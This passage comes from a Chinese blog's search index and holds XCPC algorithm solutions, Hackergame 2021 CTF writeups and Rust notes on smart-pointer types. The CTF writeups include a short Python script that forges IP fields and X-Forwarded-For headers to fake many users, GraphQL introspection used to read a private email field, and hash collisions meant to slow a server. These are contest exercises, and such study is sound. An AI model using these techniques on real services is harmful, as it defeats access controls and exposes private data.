考虑不跨过中心线的循环节，可知循环次数至少为 3（也就是子串至少出现 3 次），那破坏任何一个位置循环都会被打破，此时无法构成循环节，故这种情况统统不考虑；对于跨过中心线的循环节，只要此时不修改前缀和后缀重合的部分，这个循环节就不会被破坏。 找循环节可以用 kmp 求出来 border，也就是前缀和后缀匹配的长度，然后剔除掉所有不合法的情况，在距离上二分一下当前位置为 # 之后，前面还有几个 border 不会被破坏即可。kmp $\\mathcal{O}(|s|)$，合法 border 数量大概就 $\\mathcal{O}(\\log\\frac{|s|}{2})$个，所以最后总复杂度就是 $\\mathcal{O}(|s| + q\\log\\log |s|)$。 #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003cqueue\u003e #include \u003cstring\u003e using namespace std; vector\u003cint\u003e get_next(const string\u0026 s) { int j = -1; vector\u003cint\u003e nxt{-1}; for (int i = 0; i \u003c s.size(); i++) { while (j != -1 \u0026\u0026 s[i] != s[j]) j = nxt[j]; nxt.push_back(++j); } return nxt; } int main() { ios::sync_with_stdio(false); cin.tie(nullptr); cout.tie(nullptr); string s; cin \u003e\u003e s; auto nxt = get_next(s); int sz = s.size(); int border = sz; deque\u003cint\u003e borders; while (nxt[border] != 0) { border = nxt[border]; if (2 * border \u003c sz) { borders.push_front(border); } } int n; cin \u003e\u003e n; for (int i = 0; i \u003c n; i++) { int t; cin \u003e\u003e t; auto p = upper_bound(borders.begin(), borders.end(), min(t - 1, sz - t)); cout \u003c\u003c p - borders.begin() \u003c\u003c '\\n'; } } ","date":"2021-11-24","objectID":"/post/8697249c/:1:2","tags":["区域赛","算法竞赛","刷题","数学","比赛"],"title":"XCPC 2021 补题 memo","uri":"/post/8697249c/"},{"categories":["趣题记录"],"content":"G. Desserts 意义不明的数数题，感觉像是为了平衡难度硬凑的。 每个甜点的分发都是独立的，那任意甜点 $a$ 分给某些队伍 $k$ 就是简单的 $\\binom{k}{a}$，所以针对某个 $k$，合法的数量就是 $\\prod_{i=1}^n\\binom{k}{a_i}$。 针对每个 $k$ 拆一下式子，答案变成了： $$ \\text{ans}_k = \\prod_{i=1}^n\\binom{k}{a_i} = \\frac{(k!)^n}{\\prod_{i=1}^n{a_i!}{\\prod_{i=1}^n{(k-a_i)!}}} $$ $(k!)^n$ 直接快速幂一下，然后 $\\prod_{i=1}^n{a_i!}$ 读进来的时候就可以预处理掉。而根据限制 $0\\le a_i\\le 10^5, \\sum_{i=1}^n a_i\\le10^5$ 可知 $a_i$ 的种类就是 $\\sqrt{\\sum_{i=1}^n a_i}$ 级别的，时间复杂度是够的，搞个 unordered_map 算一下数量就行。 然后这个题就做完了，总复杂度 $\\mathcal{O}(m\\sqrt{\\sum a}\\log n)$，就是独立分析一下，默写几个板子就做完了。 #include \u003ciostream\u003e #include \u003cunordered_map\u003e using namespace std; using ll = long long; const int MOD = 998244353; const int SIZE = 1e5 + 10; ll fact[SIZE], inv[SIZE]; ll bp(ll a, ll x) { ll ans = 1; while (x) { if (x \u0026 1) { ans = ans * a % MOD; } a = a * a % MOD; x \u003e\u003e= 1; } return ans; } int main() { ios::sync_with_stdio(false); cin.tie(nullptr); cout.tie(nullptr); fact[0] = 1; for (int i = 1; i \u003c SIZE; i++) { fact[i] = fact[i - 1] * i % MOD; } inv[SIZE - 1] = bp(fact[SIZE - 1], MOD - 2); for (int i = SIZE - 2; i \u003e= 0; i--) { inv[i] = inv[i + 1] * (i + 1) % MOD; } int n, m; cin \u003e\u003e n \u003e\u003e m; ll total = 1; unordered_map\u003cint, int\u003e rec; for (int i = 0; i \u003c n; i++) { int a; cin \u003e\u003e a; total = total * inv[a] % MOD; rec[a]++; } for (int i = 1; i \u003c= m; i++) { ll ans = bp(fact[i], n) * total % MOD; for (auto [a, t] : rec) { if (i \u003c a) { ans = 0; break; } ans = ans * bp(inv[i - a], t) % MOD; } cout \u003c\u003c ans \u003c\u003c '\\n'; } } ","date":"2021-11-24","objectID":"/post/8697249c/:1:3","tags":["区域赛","算法竞赛","刷题","数学","比赛"],"title":"XCPC 2021 补题 memo","uri":"/post/8697249c/"},{"categories":["趣题记录"],"content":"J. Circular Billiard Table 根据题目，台球在桌子里滚动和碰撞不损失能量，那小球绕一定圈数过后肯定能绕出来。单纯靠反弹的话，两次相邻碰撞点构成的圆心角也是不会变的，那就是看小球能在圆里撞几圈。 图上比划一下就能得出来圆心角大小是 $2\\beta$，假设小球撞 $n$ 次就能出来，那肯定对某个系数 $w$ 满足 $n2\\beta|360w$，此时 $n$ 和 $w$ 都是最小的。 凑这个 $w$ 非常简单，先把 $\\beta=\\frac{a}{b}$ 带入上面那个式子，化简成最简分数一下得到 $n=\\frac{180b’}{a’}$，发现凑个 $w=a’$ 就整除了，答案就是 $180b’$，也就是说这个 $w$ 啥用没有，读进来 __gcd 一下然后除一下就是答案了。 #include \u003ciostream\u003e using namespace std; using ll = long long; int main() { ios::sync_with_stdio(false); cin.tie(nullptr); cout.tie(nullptr); int T; cin \u003e\u003e T; while (T--) { ll a, b; cin \u003e\u003e a \u003e\u003e b; ll g = __gcd(b * 180, a); cout \u003c\u003c b * 180 / g - 1 \u003c\u003c '\\n'; } } ","date":"2021-11-24","objectID":"/post/8697249c/:1:4","tags":["区域赛","算法竞赛","刷题","数学","比赛"],"title":"XCPC 2021 补题 memo","uri":"/post/8697249c/"},{"categories":["趣题记录"],"content":"久仰 Hackergame 大名，虽然今年是预定摸了的，但是有个朋友拉我来打，打着打着我自己上头了，也就认真搞了。 CTF noob 第一次打相关类型的比赛，幸好运气好拿到了 67 名的好成绩（至少对我这个水平来说）。学到很多东西，跟算法竞赛的体验还是不一样的，以后有时间可以多打。 ","date":"2021-10-30","objectID":"/post/f37e3945/:0:0","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"签到 点进去玩两下发现是 Unix timestamp，随便 date +%s 一下拼回 URL 就有了。 ","date":"2021-10-30","objectID":"/post/f37e3945/:1:0","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"进制十六——参上 OCR 然后 xxd。或者拿 python 转一下。 ","date":"2021-10-30","objectID":"/post/f37e3945/:2:0","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"去吧！追寻自由的电波 原音频加过速，直接 Audacity（没有 Audition，懒得装了）0.36x 速度重放一下就全能听清了，代表什么可以参考字母表。 ","date":"2021-10-30","objectID":"/post/f37e3945/:3:0","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"猫咪问答 Pro Max 搜索题，善用 WebArchive。 ","date":"2021-10-30","objectID":"/post/f37e3945/:4:0","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"卖瓜 PHP 整数溢出漏洞，玩几个数撞一下就行，我已经忘了我怎么撞出来的了。 撞的时候要注意，过了 int 的范围会被提升为 float，然后就不符合题目要求了。 ","date":"2021-10-30","objectID":"/post/f37e3945/:5:0","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"透明的文件 进去一看就两个问题： [ 前面应该拼一个 \\033； 把空格换成任意可显示字符。 然后 cat flag.txt 就可以了。 我 zsh 的主题下 flag 会一闪而过，我拿 Quicktime 录屏看的。 ","date":"2021-10-30","objectID":"/post/f37e3945/:6:0","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"旅行照片 社工题。图片里面特征最明显的就是 KFC，搜出来 KFC 店名之后可以在大众点评或者地图网站找到电话，以及能在地图网站上找到。 一个比较坑的点是地图网站显示的是店的地址而不是这个甜品站的地址 （虽然好像也没啥问题），所以你需要高德或者谷歌，打开卫星图定位到具体位置，然后方位就有了，有了方位看下阳光就能大概知道时间了。 最后楼层是暴力的，提示就是不要猜太高，也不要猜太低。 ","date":"2021-10-30","objectID":"/post/f37e3945/:7:0","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"FLAG 助力大红包 256 个助力一次都不能少。 进去看一下代码就知道他 Post 的时候会带一个 ip=x.x.x.x 的 FormData，直接改掉就 OK。然后就是后端识别 ip，猜了一下是看 X-Forwarded-For Header，试了下果然如此，那就两个都改掉直接发请求就完了。 这个题最坑的地方是有频控，发的太快会被干掉。我 sleep(2) 在接近十分钟结束的位置凑够了就过了，但是根据朋友的说法频控条件其实挺简单的，试出来了不需要这么久。懒狗过了就行。 import requests from time import sleep # 助力地址 URL = \"\" for i in range(256): requests.post(URL, data={\"ip\": f\"{i}.0.0.1\"}, headers={\"X-Forwarded-For\": f\"{i}.0.0.1\"}) sleep(2) ","date":"2021-10-30","objectID":"/post/f37e3945/:8:0","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"Amnesia ","date":"2021-10-30","objectID":"/post/f37e3945/:9:0","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"轻度失忆 因为 Immediate Value 会把 constant 的 number 直接放指令里，不会存 .data 和 .rodata，所以直接给 Hello, world! 按 ASCII 给 putchar 出去就完事儿了。 ","date":"2021-10-30","objectID":"/post/f37e3945/:9:1","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"记忆清除 汇编 noob，靠 Compiler Explorer + Google 过的这个题。 首先先把 docker 拉下来，然后随便写个代码跑一下 objdump -d，观察到： .text 之后就直接跳到 .fini 了，那么基本思路就是想办法弄段汇编塞到 .fini 之前，正确输出就可以了。 汇编比较简单，根据这篇博客和 x86 的 syscall 表，实际上就是 call 一下 write 就行。 很容易写出来下面这段： print: mov $4, %eax mov $1, %ebx mov $.LC0, %ecx mov $13, %edx int $0x80 .LC0: .string \"Hello, world!\" 然后关于放哪儿，一开始想用 __attribute__((constructor)) 给放到 .init 里面去，后面发现好像这玩意儿要过一下 libc 的一些东西，然后 libc 会放到 .text 里，这段代码根本跑不到。之后又搜了一下，发现了 __attribute__((section(\"name\"))) 这个东西，随便搞了搞试了一下好像会放到 .text 之前，然后就基本搞定了，写了下面这段代码： __attribute__((section(\"SEC\"))) void print() { asm(\"mov $4, %eax; mov $1, %ebx; mov $.LC0, %ecx; mov $13, %edx; int $0x80; \" \".LC0: .string \\\"Hello, world!\\\"\"); } int main() {} 不负众望的 crash 掉了。 objdump -d 了一下： 发现这玩意儿没对齐，接到上一个指令里面去了……，加了个 .align 2; 就正常输出了，但还是 crash。gdb 跟了一下，发现没有正常返回，那其实都不用返回，直接退出就完了，在后面补了一个 exit 的 system call 就过了。 Solution： __attribute__((section(\"SEC\"))) void print() { asm(\".align 2; mov $4, %eax; mov $1, %ebx; mov $.LC0, %ecx; mov $13, %edx; int $0x80; mov $1, %eax; mov $0, %ebx; int $0x80; \" \".LC0: .string \\\"Hello, world!\\\"\"); } int main() {} 但是看 flag 内容，感觉这个不太像 expected solution 啊？ ","date":"2021-10-30","objectID":"/post/f37e3945/:9:2","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"图之上的信息 GraphQL 能把 Schema 拿出来，所以先 __Schema 把类型查出来，发现目标应该是 GUser，然后查一下 GUser 的字段，看到邮箱是 privateEmail。那么用 userid: 1 的 query 把 privateEmail 拿出来就过了。 ","date":"2021-10-30","objectID":"/post/f37e3945/:10:0","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"Easy RSA 好久不打比赛，数论忘得一干二净。 一些预备知识可以参考From gcd to RSA。 ","date":"2021-10-30","objectID":"/post/f37e3945/:11:0","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"p Wilson 定理。 注意到 $x$ 是质数，显然 $(x-1)!\\equiv x-1\\pmod x$，又由于 $y! \u003c (x-1)!$，那直接拿 $(x-1)$ 乘逆元乘回到 $y$ 就有结果了。 ","date":"2021-10-30","objectID":"/post/f37e3945/:11:1","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"q $n$ 的每个质数可以直接通过 sympy.prevprime() 把 value[-1] 带进去拿出来。 考察解同余方程 $q^e\\equiv q’\\pmod n$。设 $q^{ke}\\equiv q\\pmod n$，根据欧拉定理有 $ke\\equiv1\\pmod{\\phi(n)}$，根据欧拉函数性质以及 $n$ 是十个质数积的性质，很容易得到 $\\phi(n)=\\prod_{i=1}^{10}p_i$，然后针对 $\\phi(n)$ 求一下 $e$ 的逆元得到 $k$，最后计算 $(q^{e})^k\\mod n$ 就结束了。 Solution: import sympy e = 65537 def solve_p(): x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451 y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439 p = x - 1 for i in range(1, x - y): p = p * pow(x - i, x - 2, x) % x # p = 10569944080090591401315432556965818857327680380269154543273468441025963038065648915158194147019839932524599260058098616377893091051396090650574162446875193 return sympy.nextprime(p) def solve_q(): value = [ 80096058210213458444437404275177554701604739094679033012396452382975889905967 ] n = value[-1] phi = value[-1] - 1 for i in range(1, 10): value.append(sympy.prevprime(value[-1])) n *= value[-1] phi *= value[-1] - 1 k = sympy.mod_inverse(e, phi) q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819 q = pow(q, k, n) # q = 10477925992460766451892208516181598312750484426056814542870756188277177949099084361476539803367804757559880919838828678145609717295215924948786830953570263 return sympy.nextprime(q) if __name__ == \"__main__\": # p = solve_p() p = sympy.nextprime( 10569944080090591401315432556965818857327680380269154543273468441025963038065648915158194147019839932524599260058098616377893091051396090650574162446875193 ) # q = solve_q() q = sympy.nextprime( 10477925992460766451892208516181598312750484426056814542870756188277177949099084361476539803367804757559880919838828678145609717295215924948786830953570263 ) d = sympy.mod_inverse(e, (p - 1) * (q - 1)) c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478 m = pow(c, d, p * q) print(\"m =\", m) print(f'flag = {m.to_bytes((m.bit_length() + 7) // 8, byteorder=\"big\")}') ","date":"2021-10-30","objectID":"/post/f37e3945/:11:2","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"加密的 U 盘 人生中第一次听说 LUKS，还挺牛逼的这东西。 官方 FAQ 1.2 节明确指出了同一块盘多次做镜像，master key 是不会变的，所以解密 day1 的镜像，dump 出来 master key 再解密 day2 的就能拿到 flag 了。 谁能想到这题最复杂的部分不是思路，而是学习软件操作和配环境呢？ ","date":"2021-10-30","objectID":"/post/f37e3945/:12:0","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"赛博厨房 ","date":"2021-10-30","objectID":"/post/f37e3945/:13:0","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"Level 0 模拟，看图写代码。 ","date":"2021-10-30","objectID":"/post/f37e3945/:13:1","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"Level 1 直接写指令不够，用 如果手上的物品大于等于 n 向上跳转 m 行 做一个 jmp 就够了。 ","date":"2021-10-30","objectID":"/post/f37e3945/:13:2","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"助记词 ","date":"2021-10-30","objectID":"/post/f37e3945/:14:0","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"第一顿大餐 读代码看到暂停的位置是 Phrase::equals()，然后 Phrase 会被放进一个 LinkedHashMap 里面去，那也就是说加的词要尽可能多走 equals，那就是需要哈希碰撞。 看了下 Phrase::hashCode()，稍微审计一下发现 3 个元素只有 text 部分是可控的，所以考虑撞一下。 撞的过程比较简单，先笛卡尔积拼出来找到 hash 一样的，这样能把碰撞 double 一下，然后再和笛卡尔积的结果拼起来一起求一下就能找到好几个碰撞了。 之后卡壳了，想了半天这个最长的碰撞就 6 个，跑暴力的话跑到明年比赛结束都不一定跑完啊？ 重新仔细读了一下代码： var before = System.nanoTime(); for (var i = 0; i \u003c input.length() \u0026\u0026 i \u003c MAX_PHRASES \u0026\u0026 phrases.size() \u003c MAX_PHRASES; ++i) { var text = input.optString(i, \"\").toLowerCase(Locale.ENGLISH); modified += phrases.add(Phrase.create(this.mnemonics, text, token)) ? 1 : 0; } var after = System.nanoTime(); var duration = TimeUnit.MILLISECONDS.convert(after - before, TimeUnit.NANOSECONDS); 原来一次多传点就行，不是每次只能传一个。随便发个请求就结束了。 Token 记得正确 URL 转义，我直接复制粘贴交了好几发都没看到 flag，又读了一边代码。 Solution: import requests URL = \"\" # 预先找到的几个碰撞，其实应该还有更多 ITEMS = [ \"damage official text association\", \"category attention text association\", \"other income statement pair\", \"flight cause statement pair\", \"source return lake step\", \"save past lake step\", \"physical fishing while money\", \"working cash officer blood\", \"test school officer blood\", \"system investment management debate\", \"author stock while money\", \"exam mouse management debate\" ] print(requests.post(URL, data=f'{ITEMS[:32]}').json()) ","date":"2021-10-30","objectID":"/post/f37e3945/:14:1","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"Co-Program ","date":"2021-10-30","objectID":"/post/f37e3945/:15:0","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["趣题记录"],"content":"Co-Login 核心思路就是把 target 带进去之后，尽可能用乘 0 之类的形式把其他元消掉，只剩 target。 首先拉了 100 个 test case 看了一下，大部分都是简单的一元或者二元表达式，基本上就用几个可能的数拿进去 dfs 撞一下就能出结果。 先写个 parser 和 evaluator，evaluator 最基本的 RPN 应该就够了，然后全程该模 $2^{36}$ 的和需要用 $2^{36}$ 减回去的值都正确处理一下，剩下的撞就行。~~我之前抄了个语言，看了下 parser 是对的就直接搞了。 关于构件的 candidate，注意到有 (j+j)，(i/j) 和 (i%j) 这些式子，把 $0, 1, t, 2t, \\frac{t}{2}$ 和对应的用 $2^{36}$ 减掉的值都塞进去，xjb 撞一下基本就过了（？。复杂度比较简单，构件总共 10 个，假定 6 个变量，也只需要 10^6 次 operation，看着是指数复杂度其实很快。 ","date":"2021-10-30","objectID":"/post/f37e3945/:15:1","tags":["Hackergame","逆向","数学","比赛"],"title":"Hackergame 2021 Writeups","uri":"/post/f37e3945/"},{"categories":["技术笔记"],"content":"对于一门对内存控制足够精细的语言来说，值类型与引用类型的区别是十分重要的：值类型通常意味着较低的拷贝成本，通常来说，这样的类型被分配在栈上（当然，对于 C/C++ 来说，我们可以在堆上直接分配一个值类型对象，如 int），而引用类型则通常分配在堆上，我们需要用一个包装过的对象去维护。 在 Rust 中，值类型和引用类型的界限在语言上提供了很明确的区分，而为了避免 C/C++ 中用户可以不受限制使用裸指针的情况，Rust 将很多裸指针操作都包在了 unsafe 块内，用户使用时必须对这种行为有足够的认知。当然，当用户需要使用指针，或者说引用类型的时候，Rust 也提供了 7 种包装类型来帮助用户更好的管理堆上的内存。 然而，Rust 官方教程和文档对这 7 种包装类型的介绍有很多容易混淆之处，同时网上的很多文章也已经完全脱离了最新版 Rust 的功能描述（如很多文章仍然描述 Cell 只接受实现了 Copy 的类型），导致很多初学者学习时容易产生迷惑和误用。这篇文章是我在复习 Rust 时重新学习包装类型相关时做出的笔记，希望能更好的帮助大家理解 Rust 的包装类型。 本文写作时的 Rust 版本为 Stable Channel 1.48.0。 ","date":"2020-11-24","objectID":"/post/b63a9600/:0:0","tags":["Rust","智能指针","包装类型"],"title":"Rust 的包装类型","uri":"/post/b63a9600/"},{"categories":["技术笔记"],"content":"三个重要的 Trait ","date":"2020-11-24","objectID":"/post/b63a9600/:1:0","tags":["Rust","智能指针","包装类型"],"title":"Rust 的包装类型","uri":"/post/b63a9600/"},{"categories":["技术笔记"],"content":"Send Send 是一个 Marker，用于标记一个类型可以在线程间安全的移动。对于绝大部分类型，编译器会自动实现 Send Trait，用户也可以手动实现。如果需要标记一个类型是不可以移动的，需要实现 !Send。 下面的代码块应该能较好的解释 Send 的作用： use std::vec::Vec; use std::{thread, time}; struct Job { number: i32, } // 取消这行注释将告诉编译器这个类型跨线程移动是不安全的 // 不应该自动实现 `Send`，导致编译失败 // impl !Send for Job {} impl Job { fn new(number: i32) -\u003e Job { Job { number } } } fn main() { let mut v = Vec::with_capacity(5); for i in 0..5 { let job = Job::new(i); v.push(thread::spawn(move || { println!(\"Running job: {}\", job.number); thread::sleep(time::Duration::from_secs(5 - job.number as u64)); println!(\"Finish job: {}\", job.number); })); } for handle in v { handle.join().unwrap(); } } 更多关于 Send 的解释，可以参考 The Rustonomicon. ","date":"2020-11-24","objectID":"/post/b63a9600/:1:1","tags":["Rust","智能指针","包装类型"],"title":"Rust 的包装类型","uri":"/post/b63a9600/"},{"categories":["技术笔记"],"content":"Copy 与 Clone 对于 Rust 来说，复制一个对象是一个显式行为（因为默认语义是移动语义），只有一个例外：Copy。 Clone trait 的作用很简单，定义了一个对象的拷贝行为。我们可以用 #[derive(Clone)] 来自动实现 Clone，实际上就是对每一个对象调用了 .clone() 拷贝到新对象中，即执行了一次深拷贝。 而 Copy 则意味着，当我们使用 let x = y; 时，y 会被自动复制一份到 x，而不是移动到 x。默认的 Copy 实现是按位拷贝内存（即 memcpy），而如果我们想要自己实现，由于 Copy 是一个 Marker trait，意味着它本身没有任何可以实现的方法，所以如果你不使用 #[derive(Copy)] 来实现的话，你只能通过实现 Clone trait 来实现 Copy。 你可以认为对于 Rust 来说，Copy 语义所描述的值都可以是值类型（Rust 可以做隐式拷贝），而 Clone 对两种类型都有用。关于 Copy 和 Clone 的更多相关内容，可以参考标准库文档。 ","date":"2020-11-24","objectID":"/post/b63a9600/:1:2","tags":["Rust","智能指针","包装类型"],"title":"Rust 的包装类型","uri":"/post/b63a9600/"},{"categories":["技术笔记"],"content":"从 Box 开始 Box\u003cT\u003e 是在学习 Rust 中第一个接触到的包装类型，它的职责很简单：在堆上分配一个 T 类型的内存空间，并将其指针包装后返回给用户。它是一个非常简单的指针封装。 对于用户来说，Box\u003cT\u003e 并没有什么特殊的地方：它自身是一个值，有移动语义，当我们需要它维护的内部对象时，需要使用 .as_ref() 或者 .as_mut() 这样的 API 拿出来其中的值进行操作。当 Box\u003cT\u003e 走到作用域末尾时，里面的内部对象会被自动 drop 掉。 为了同 Rc\u003cT\u003e 以及 Arc\u003cT\u003e 区别，我们实际上描述 Box\u003cT\u003e 是一个唯一所有权指针：在任何时刻，这个指针只能被一个对象/函数等持有，而不能同时出现在多个地方。对内部真实值的访问会受到 Borrow Checker 的检查，保证引用是安全的。 要注意的是，Box\u003cT\u003e 并没有实现 Send trait，这意味着我们不能直接跨线程移动 Box\u003cT\u003e。 一个简单的 🌰： fn test(num: Box\u003ci32\u003e) { println!(\"Box is moved: {}\", num); } fn main() { let mut b = Box::new(15); println!(\"{}\", b); let mr = b.as_mut(); *mr = 20; println!(\"{}\", b); test(b); // 这会导致一个编译错误 // let r = b.as_ref(); } ","date":"2020-11-24","objectID":"/post/b63a9600/:2:0","tags":["Rust","智能指针","包装类型"],"title":"Rust 的包装类型","uri":"/post/b63a9600/"},{"categories":["技术笔记"],"content":"Rc 与 Arc Rc\u003cT\u003e 的全名是 Reference Counting，从名字上就能看出来，这是一个带有引用计数的包装类型。换句话说，它所维护的资源具有多所有权：允许多个对象/函数等持有同一个资源的所有权。为了保证这样的持有是安全的（即对每个持有者来说，所持有的资源不会发生预期之外的改变），Rc\u003cT\u003e 维护的对象是不可变的，这意味着我们没有任何办法拿到一个 \u0026mut 来改变内部的值。 一个简单的 🌰： use std::rc::Rc; fn test(num: Rc\u003ci32\u003e) { println!( \"We got an rc: {} with count: {}\", num, Rc::strong_count(\u0026num) ); } fn main() { let rc = Rc::new(10); println!(\"{}\", rc); let r = rc.as_ref(); println!(\"{}\", *r); // 复制了指针，引用计数 +1 test(rc.clone()); // 此时借用没有问题 let _r = rc.as_ref(); } Rc\u003cT\u003e 的引用计数并不是原子的，这导致 Rc\u003cT\u003e 的跨线程访问是不安全的。为了解决这个问题，官方库提供了 Arc\u003cT\u003e 来维护跨线程的资源共享。A 在这里的意思就是 Atomically，原子化，即 Arc\u003cT\u003e 的引用计数增减操作是原子操作，保证了跨线程可见是安全的。而在其他地方，它和 Rc\u003cT\u003e 没什么不同。 另一个简单的 🌰： use std::rc::Rc; use std::sync::Arc; use std::thread; fn test(num: Arc\u003ci32\u003e) { println!( \"We got an arc: {} with count: {}\", num.as_ref(), Arc::strong_count(\u0026num) ); } fn main() { let rc = Rc::new(10); let arc = Arc::new(1); let clone = arc.clone(); let handle = thread::spawn(move || { test(clone); // 如果取消掉下面的注释会显示编译错误 // rc.as_ref(); }); handle.join().unwrap(); } ","date":"2020-11-24","objectID":"/post/b63a9600/:3:0","tags":["Rust","智能指针","包装类型"],"title":"Rust 的包装类型","uri":"/post/b63a9600/"},{"categories":["技术笔记"],"content":"Cell 与 RefCell 在聊这两个包装类型之前，我们先聊一聊什么叫“内部可变性”。 内部可变性，其实有 C++ 经验的同学应该很熟悉：const 指针。内部可变性指的是，我们所持有的代理对象是不可变的，这通常意味着我们不能指向一个新的代理对象，或者不能直接原地将这个代理对象给释放，而这个代理对象维护的真实数据，是可变的。 在很多场景中，我们确实需要使用一个不可变的对象，但是需要修改内部的值，这就是内部可变性的用途。一个典型例子是，我们将一个正则表达式编译成了一个内部的数据结构，这个数据结构通常会维护在字符串中的指针等信息，这些数据要求可变，然而，我们并不想让这种修改暴露到外界。这种情况下，我们使用不可修改的正则表达式暴露给用户，但是内部的数据则可以使用内部可变性来维护。 在 Rust 中，如果我们想修改一个值（比如通过 \u0026mut 拿到可变引用并修改），我们通常也需要将原始值定义为 mut 的。为了提供内部可变性，Rust 提供了两种类型来满足这个需求，Cell\u003cT\u003e 和 RefCell\u003cT\u003e。 我们首先聊一下 Cell\u003cT\u003e。在很多古老的文章中，Cell\u003cT\u003e 都被描述为 T 必须实现了 Copy trait，然而这个限制在 Rust 1.17.0 之后便被移除了，T 的类型目前没有任何特殊的要求。 对于设置操作来说，我们可以使用 set 来设置一个值，使用 replace 对值进行原地替换，使用 into_inner 消费 Cell\u003cT\u003e 并获取内部的值。而对于取值操作，实现了 Default 的对象我们可以使用 take 将值移动出 Cell\u003cT\u003e，而实现了 Copy 的对象我们可以使用 get。如果要获取内部的可变引用，我们可以使用 get_mut 方法，此时的引用可以被编译器做静态分析。 然而，我们并不总是想消费 Cell\u003cT\u003e 拿到值，也许我们只需要一个引用；或者来说，我们需要在运行时执行一些借用操作（例如在多线程环境下），而这些操作不能被静态分析。这个时候，Rust 提供了 RefCell\u003cT\u003e。RefCell\u003cT\u003e 并没有什么魔法，它只是使用了一组 Wrapper 对象（Ref/RefMut）来包装引用，同时实现了运行时的借用检查——也就是说，对 RefCell\u003cT\u003e 进行了非法的借用时，可能会导致运行时 panic。 一组混合的 🌰： use std::cell::{Cell, RefCell}; use std::mem::drop; fn main() { let c = Cell::new(10); let rc = RefCell::new(15); println!(\"{:?}, {:?}\", c, rc); // 如果想让下面这一行编译通过，需要对 c 添加 mut // let rc = c.get_mut(); // *rc = 5; // 相反，我们可以用 replace c.replace(1); // 而对于 RefCell 来说，这样的引用是可以的 let mut rc_mut = rc.borrow_mut(); *rc_mut = 20; // 会显示值被 borrow println!(\"{:?}\", rc); // 此时直接使用 rc.borrow() 会 panic // 更好的做法是使用 rc.try_borrow() 获取一个 Result\u003c\u003e // rc.borrow(); if let Ok(_) = rc.try_borrow() { println!(\"We got an reference!\"); } else { println!(\"Somebody must has got a mutating reference!\"); } drop(rc_mut); // drop 掉 rc_mut 之后，值就可以被正常显示了 println!(\"{:?}\", rc); // 多个不可变的引用是可以的 let b1 = rc.borrow(); let b2 = rc.borrow(); println!(\"{:?}, {:?}, {:?}\", rc, b1, b2); // 它也会 panic，整体借用规则跟 Rust 静态分析的一致 ;) // let bm = rc.borrow_mut(); let _val = c.into_inner(); // into_inner 之后，c 就被消费了，下面的操作会导致编译错误 // 